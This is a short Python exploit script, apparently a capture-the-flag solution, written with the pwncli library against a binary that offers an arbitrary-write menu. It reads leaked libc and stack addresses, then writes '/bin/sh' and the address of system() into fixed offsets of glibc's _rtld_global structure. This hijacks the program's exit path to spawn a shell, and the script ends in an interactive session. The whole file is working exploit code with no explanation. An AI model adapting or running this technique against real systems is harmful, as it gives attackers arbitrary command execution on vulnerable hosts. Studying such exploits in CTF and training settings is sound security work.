from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']

def write(addr:int, content:(str, bytes)):
    assert len(content) % 8 == 0, "len error!"
    for i in range(0, len(content), 8):
        p.sendlineafter("(q)uit\n", 'w')
        p.sendlineafter("ptr: ", str(addr + i))
        p.sendlineafter("val: ", str(u64(content[i:i+8])))

libc.address = int16((p.recvline()[6:-1]).decode()) - libc.sym['puts']

stack_addr = int16((p.recvline()[7:-1]).decode())
log_address("libc_base_addr", libc.address)
log_address("stack addr", stack_addr)

rtld_global_addr = libc.address +  0x619060
log_address("rtld_global_addr", rtld_global_addr)

write(rtld_global_addr+0x908, "/bin/sh\x00")
write(rtld_global_addr+0xf00, p64(libc.sym['system']))

p.sendlineafter("(q)uit\n", 'q')
p.interactive()